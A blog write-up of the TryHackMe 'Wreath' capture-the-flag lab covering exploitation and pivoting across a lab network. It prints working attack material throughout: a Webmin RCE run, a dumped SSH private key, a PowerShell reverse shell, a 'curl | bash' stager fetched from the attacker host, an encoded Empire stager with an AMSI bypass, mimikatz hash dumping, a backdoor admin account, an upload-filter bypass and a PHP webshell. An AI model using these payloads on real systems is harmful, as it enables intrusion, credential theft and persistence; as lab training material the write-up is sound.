---
title: "THM Wreath Writeup"
date: 2023-07-08
tags: ["CTF","Security"]
description: "You get a pivot, and you get a pivot."
draft: false
type: page
---
# THM "Wreath" Write Up

Wreath was a multi-machine network comprised of windows and linux machines focused on the concept of pivoting. There was a lot of other great tidbits in there as well like basic obsfucation and AV bypass, as well as compiling your own tools. Overall, I learned a lot here!

## Initial Enumeration

We have an initial IP to go off of so lets go ahead and throw nmap at it.

```bash
[~/thm/wreath]$ nmap -sC -sV -p- -oA wreath1 10.200.84.200
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-05 21:04 EDT
Nmap scan report for 10.200.84.200
Host is up (0.11s latency).
Not shown: 65382 filtered tcp ports (no-response), 148 filtered tcp ports (host-unreach)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_ssl-date: TLS randomness does not represent time
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2023-07-06T00:45:12
|_Not valid after:  2024-07-05T00:45:12
| http-methods:
|_  Potentially risky methods: TRACE
| tls-alpn:
|_  http/1.1
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.18 seconds
```


From here we have some interesting stuff, notably, a web server, zues-admin, a version of webmin/miniserv.

Long story short, Webmin 1.890 has an [RCE](https://github.com/MuirlandOracle/CVE-2019-15107).

```bash
[~/thm/wreath/CVE-2019-15107]$ ./CVE-2019-15107.py -p 10000 10.200.84.200    [main]

        __        __   _               _         ____   ____ _____
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|

                                                @MuirlandOracle


[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.200.84.200:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

#
```

The server was running as root!

We even have persistence by cat-ing out /root/.ssh/id_rsa.

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```



## Pivoting

Since we are already root, no need to privesc and we can look to move further into the network.

After a dive into some pivoting theory, we can put nmap onto the machine and scan the network.

```bash
[root@prod-serv ~]# ./nmap -sn 10.200.84.0/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-07-06 22:09 BST
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-84-1.eu-west-1.compute.internal (10.200.84.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.18s latency).
MAC Address: 02:F3:70:5F:3A:E7 (Unknown)
Nmap scan report for ip-10-200-84-100.eu-west-1.compute.internal (10.200.84.100)
Host is up (0.00054s latency).
MAC Address: 02:CE:87:99:87:F5 (Unknown)
Nmap scan report for ip-10-200-84-150.eu-west-1.compute.internal (10.200.84.150)
Host is up (0.0021s latency).
MAC Address: 02:FE:34:39:76:4D (Unknown)
Nmap scan report for ip-10-200-84-250.eu-west-1.compute.internal (10.200.84.250)
Host is up (0.0010s latency).
MAC Address: 02:9C:9D:AF:36:F5 (Unknown)
Nmap scan report for ip-10-200-84-200.eu-west-1.compute.internal (10.200.84.200)
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 4.95 seconds
```

```bash
[root@prod-serv ~]# ./nmap -p- -iL hosts.txt

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-07-06 22:13 BST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-84-100.eu-west-1.compute.internal (10.200.84.100)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.20s latency).
All 65535 scanned ports on ip-10-200-84-100.eu-west-1.compute.internal (10.200.84.100) are filtered
MAC Address: 02:CE:87:99:87:F5 (Unknown)

Nmap scan report for ip-10-200-84-150.eu-west-1.compute.internal (10.200.84.150)
Host is up (0.00051s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
MAC Address: 02:FE:34:39:76:4D (Unknown)

Nmap done: 2 IP addresses (2 hosts up) scanned in 713.99 seconds
```

Now that we have a target, we can pivot in.

```bash
sudo sshuttle -r root@10.200.84.200 --ssh-cmd “ssh -i id_rsa” 10.200.84.0/24 -x 10.200.84.200
```


We get a django error page with some routes navigating to the page and can get to the login by going to `/gitstack`.
```bash
Page not found (404)
Request Method: 	GET
Request URL: 	http://10.200.84.150/

Using the URLconf defined in app.urls, Django tried these URL patterns, in this order:

    ^registration/login/$
    ^gitstack/
    ^rest/

The current URL, , didn't match any of these.
```

![](attachment/e7a3400d56587c689820029edcfb9da5.png)


Default creds didn't work :(.

But there may be an RCE :).

```bash
[~/thm/wreath]$ searchsploit gitstack
-------------------------------------------------- ---------------------------------
 Exploit Title                                    |  Path
-------------------------------------------------- ---------------------------------
GitStack - Remote Code Execution                  | php/webapps/44044.md
GitStack - Unsanitized Argument Remote Code Execu | windows/remote/44356.rb
GitStack 2.3.10 - Remote Code Execution           | php/webapps/43777.py
-------------------------------------------------- ---------------------------------
```

By default the exploit just runs `whoami`, so we will need to put our own payload.

```bash
[~/thm/wreath]$ python 43777.py
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[+] Get user list
[+] Found user twreath
[+] Web repository already enabled
[+] Get repositories list
[+] Found repository Website
[+] Add user to repository
[+] Disable access for anyone
[+] Create backdoor in PHP
Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work.
[+] Execute command
"nt authority\system
```

It also uploaded a webshell at `POST /web/exploit.php` via `a=COMMAND` in the POST data'

```bash
curl -X POST http://10.200.84.150/web/exploit.php -d "a=whoami"
```


From here we can also load into burp repeater to make our lives much, much easier. Lets see if we can connect back to our attack box with a ping.

```
a=ping -n 4 10.50.85.139
```

as expected we can't make it back so a shell is not going to be that easy.

we will need to either forward or catch the shell on the other server on this network.

FIrst centos has a very restrictive firewall policy so we will have to open up a port to allow trafiic on 8888 on the gitstack server, and 8888 and 443 on the relay server.

```bash
firewall-cmd --zone=public --add-port 443/tcp
firewall-cmd --zone=public --add-port 8888/tcp
```

We have socat on our relay server to relay the traffic back to our nc listener on 443 on our attack box. 

```
./soca tcp-l:8888  tcp:10.50.85.139:443
```

We can use a PS payload here.

```Powershell
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.84.200',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Now we have a stable shell on the windows box.

 For persistence we can add a user.

```cmd
net user gabad00 gabad00 /add
net localgroup Administrators gabad00 /add
net localgroup "Remote Management Users" gabad00 /add
```

Now we can get in with either RDP or winrm. Here we will use winrm.

```bash
evil-winrm -i 10.200.84.150  -u gabad00 -p 'gabad00'
```

We can also use xfreerdp to rdp in.

```
xfreerdp /v:10.200.84.150 /u:gabad00 /p:'gabad00' /dynamic-resolution +clipboard /drive:/home/kali/thm/wreath,kali-share
```

This also mounted a share with all of our tools in it so we can open it up and dump the password hashes with mimikatz.

```cmd
\\tsclient\kali-share\tools\Post-Exploitation
```

```cmd
privilege::debug
token::elevate
lsadump::sam
```

Now we have various hashes to crack or pass, such as:  

```bash
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.84.250
```

## c2 

We have a solid foothold in the network and can now consolidate our position and try to simplify post exploitation.

We will be using `Empire` here.


#### Installation

Starkiller is the GUI frontend.

```bash
sudo apt install powershell-empire starkiller
```

```bash
sudo powershell-empire server
```

```bash
sudo powershell-empire client
```

Change the connection info 
```
/usr/share/powershell-empire/empire/client/config.yaml
```

Connect on another host:

```bash
powershell-empire client connect HOSTNAME --username=USERNAME --password=PASSWORD
```

```bash
starkiller - in the empire prompt to start
```

```
http://localhost:1337/index.html
```

```
empireadmin
password123
```

### Listeners

Since we can't get to the git server directly, we will need to compromise the web server and add it into empire and pivot from there. The first step in that is a listener.

```bash
uselistener http
``` 

Similar to metasploit we can set our options from here.

```
options
set option VALUE
```

```
(Empire: uselistener/http) > set Host 10.50.85.139
INFO: Set Host to 10.50.85.139

(Empire: uselistener/http) > set Port 8000
INFO: Set Port to 8000

(Empire: uselistener/http) > set Name CLIHTTP
INFO: Set Name to CLIHTTP

execute
kill CLIHTTP
```

#### Stagers

```
usestager - there should be a white space after this, this will give us a list

multi/launcher is a good bet generally
multi/bash is a good choice here

set listener VALUE 

execute
```

## Getting a callback

I saved the stager, hosted it on a simple python server and executed it on the machine.

```bash
curl http://10.50.85.139/stager.sh | bash
```

Now, we have an agent.

```bash
[+] New agent CVFDEOHD checked in
```

```
agents
interact <agent_name>
help
```

```bash
(Empire: agents) > interact CVFDEOHD
(Empire: CVFDEOHD) > shell whoami
INFO: Tasked CVFDEOHD to run Task 1
[*] Task 1 results received
root
(Empire: CVFDEOHD) > shell id
INFO: Tasked CVFDEOHD to run Task 2
[*] Task 2 results received
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

We can use `back` to exit the interaction.

```bash
(Empire: agents) > rename CVFDEOHD WEB1
INFO: Agent successfully renamed to WEB1
```


### Gitting to the Git

We are going to want to use the hop listener to get to the server that we want to get to here


```bash
uselistener http_hop
```

The big difference here is that we need a redirect listener.

```bash
[(Empire: uselistener/http_hop) > set Host
(Empire: uselistener/http_hop) > set Host 10.50.85.139
INFO: Set Host to 10.50.85.139
(Empire: uselistener/http_hop) > set Port 9999
INFO: Set Port to 9999
(Empire: uselistener/http_hop) > set Name
(Empire: uselistener/http_hop) > set Name HOPPA
INFO: Set Name to HOPPA](<(Empire: uselistener/http_hop) %3E set Host
(Empire: uselistener/http_hop) > set Host 10.50.85.139
INFO: Set Host to 10.50.85.139
(Empire: uselistener/http_hop) > set Port 9999
INFO: Set Port to 9999
(Empire: uselistener/http_hop) > set Name
(Empire: uselistener/http_hop) > set Name HOPPA
INFO: Set Name to HOPPA
(Empire: uselistener/http_hop) > set RedirectListener
(Empire: uselistener/http_hop) > set RedirectListener CLIHTTP
INFO: Set RedirectListener to CLIHTTP
(Empire: uselistener/http_hop) > set RedirectListener CLIHTTP
INFO: Set RedirectListener to CLIHTTP>)
```

There will now be a folder in `tmp` by the name the listener containing the redirecter files.

Zip the files up:

```bash
cd /tmp/http_hop && sudo zip -r hop.zip *
```

Put them on the server:

```
curl http://10.50.85.139/hop.zip --output hop.zip
```

Serve the files on a php web server:

```bash
php -S 0.0.0.0:9999 &>/dev/null &
```

We also have to open up the firewall and ensure the port from our existing listener is also open:

```bash
firewall-cmd --zone=public --add-port 9999/tcp
```



We also need a stager

```bash
usestager multi_launcher
set Listener HOPPA
```

 Drop our payload through the web shell (make sure the sshuttle connection is still open to proxy traffic through):


```powershell
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAcgBvAHgAeQA9AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARABlAGYAYQB1AGwAdABXAGUAYgBQAHIAbwB4AHkAOwAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwA9AC0AdABVAGIAWAByAEMAKgAyAEUAbQBuADcAOQAhAE4AbAB+ADwAMQB5AHAAUgBZAHsAMwBrAEsAPgBvADYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQA3AHgAYQBUADAAbgBSAHAAbgA4AHMAUABaADkAUQBnAGYAcwBoADgAWgA0AHAAVgBKAHoARQA9ACIAKQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHgAQQBEAEEAQQBMAGcAQQAxAEEARABBAEEATABnAEEANABBAEQAVQBBAEwAZwBBAHgAQQBEAE0AQQBPAFEAQQA2AEEARABrAEEATwBRAEEANQBBAEQAawBBACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABoAG8AcAA9ACcASABPAFAAUABBACcAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
```

#### Modules

We can use modules, such as mimikatz, sherlock, etc on the compromised target afterwards.

```bash
interact <agent_name>
usemodule <module_name>
options
execute
```


#### Shell 

```bash
shell
exit with ctrl+c
```


#### Enumeration on the PC

We now have the git-serv checking in as an agent in empire and can arbitrarily upload and download files using evil-winrm. We can use this to further enumerate into the network.

We will upload `nc.exe` and `Invoke-Portscan.ps1` using evil-winrm's upload feature.

```
. .\Invoke-Portscan.ps1
Get-Help Invoke-Portscan
Invoke-Portscan -Hosts 10.200.84.100 -TopPorts 50
```


This was not working well for some reason, but if I just tried to connect to the two ports I suspected were open, they were.

```powershell
*Evil-WinRM* PS C:\windows\temp> Test-NetConnection -Port 80 -Computer 10.200.84.100


ComputerName     : 10.200.84.100
RemoteAddress    : 10.200.84.100
RemotePort       : 80
InterfaceAlias   : Ethernet
SourceAddress    : 10.200.84.150
TcpTestSucceeded : True

*Evil-WinRM* PS C:\windows\temp> Test-NetConnection -Port 3389 -Computer 10.200.84.100


ComputerName     : 10.200.84.100
RemoteAddress    : 10.200.84.100
RemotePort       : 3389
InterfaceAlias   : Ethernet
SourceAddress    : 10.200.84.150
TcpTestSucceeded : True


```


#### Pivoting Even Further

To pivot even further we will require a firewall rule for the proxy that I am going to start.

```
netsh advfirewall firewall add rule name="Chisel-gabad00" dir=in action=allow protocol=tcp localport=9900
```


```cmd
.\chisel.exe server -p 9900 --socks5.\chisel.exe server -p 9900 --socks5 - our windows host
./chisel client 10.200.84.150:9900 1080:socks
```

The proxy took forever to boot up, but it did and that is what matters. Now we can see this webpage and attack it through traffic we send via proxychains.

We can get some insight into the tech stack here from the headers.

```http
HTTP/1.1 304 Not Modified
Date: Sat, 08 Jul 2023 22:30:04 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
Connection: Keep-Alive
Keep-Alive: timeout=5, max=100
ETag: "3dc7-5b39a5a80eecc"
```

Side note: I just recently learned about 304 status codes.

Since we have access to the source code via the git server, we can see if there are any interesting findings there.

I leveraged starkiller to find the code, and looked around in the gui file manager. I attempted to leverage some findstr commands but was unsuccessful.

```cmd
c:\gitstack\repositories\website.git
```

I also ended up using starkiller to download the files.
One we have the files, we can use [Git Tools](https://github.com/internetwache/GitTools)to do some analysis.

We will use extractor to recreate the repo.

What we need is a directory with git files and a directory to put the rebuilt files in. The git files need to be properly renamed .git and a subdirectory of another folder. The output folder will be created if it does not exist.

```bash
[~/thm/wreath]$ ./extractor.sh git-shenanigans stuff
```

The writeup provided this lovely bash one-liner to get our commit info all formatted nicely:

```bash
separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
```

```

=======================================
0-70dde80cc19ec76704567996738894828f4ee895
tree d6f9cc307e317dec7be4fe80fb0ca569a97dd984
author twreath <me@thomaswreath.thm> 1604849458 +0000
committer twreath <me@thomaswreath.thm> 1604849458 +0000

Static Website Commit


=======================================
1-345ac8b236064b431fa43f53d91c98c4834ef8f3
tree c4726fef596741220267e2b1e014024b93fced78
parent 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
author twreath <me@thomaswreath.thm> 1609614315 +0000
committer twreath <me@thomaswreath.thm> 1609614315 +0000

Updated the filter


=======================================
2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
tree 03f072e22c2f4b74480fcfb0eb31c8e624001b6e
parent 70dde80cc19ec76704567996738894828f4ee895
author twreath <me@thomaswreath.thm> 1608592351 +0000
committer twreath <me@thomaswreath.thm> 1608592351 +0000

Initial Commit for the back-end


=======================================

```

The number at the start of these directories is arbitrary, and depends on the order in which GitTools extracts the directories. What matters is the hash at the end of the filename.

By the commit hashes, the most up to date is `1-345ac8b236064b431fa43f53d91c98c4834ef8f3`.

What we are interested in here is php. 

```bash
[~/thm/wreath/stuff/1-345ac8b236064b431fa43f53d91c98c4834ef8f3]$ find . -name "*.php"
./resources/index.php
```

Looking at the file upload filtering, we can see that there is:

1. A filter on the extensions when files are being uploaded
2. A check on the imageSize in the exif data
3. the files are going to the uploads directory


We can go to `resources` where we get prompted for basic auth.

We have seen a number of username possibilities including:
1. twreath
2. thomaswreath
3. thomas

We also have a hash from the previous machine that we have cracked and know to be:

```
i<3ruby
```

The right combo appeared to be `thomas:i<3ruby`

Now, we have the ability to upload files to the webserver.

We can download an image and start testing filter bypasses.

The filter is only checking that there is an allowed file extension somewhere, so we can tack a .php on the end. 

The next question is where to put our webshell. That would be the comment field.

```bash
cp image.jpg gabad00-shell.jpeg.php
exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" gabad00-shell.jpeg.php
```

Now, we can upload our file, and see we successfully bypassed the filter. 

We can execute the payload if we go to `resources/uploads/$FILE`.

It executes!

Now, we have to reckon with antivirus.


#### AV Bypass

This, is the PHP code we will be using for our shell.

```php
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

It checks to see if a get parameter called wreath has been set, and then it calls shell_exec wrapped in pre tags.

